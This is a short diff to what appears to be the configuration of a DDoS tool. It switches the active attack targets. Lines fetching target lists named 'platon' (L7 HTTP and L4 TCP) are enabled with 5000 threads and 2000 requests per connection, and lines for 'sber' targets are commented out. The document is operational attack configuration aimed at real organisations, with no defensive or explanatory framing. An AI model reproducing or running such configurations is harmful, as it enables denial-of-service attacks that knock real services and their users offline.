@@ -2,17 +2,17 @@
 
 #UNCOMMENT:
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/platon/platon_l7 -t 5000 --rpc 2000 --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/platon/platon_l7 -t 5000 --rpc 2000 --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/platon/platon_l4_tcp -t 5000 --rpc 2000
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/platon/platon_l4_tcp -t 5000 --rpc 2000
 
 #COMMENT:
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_url --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_url --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_l7_http --http-methods GET STRESS
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_l7_http --http-methods GET STRESS
 
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_l4_tcp
+#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_l4_tcp
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/sber_l4_udp
 
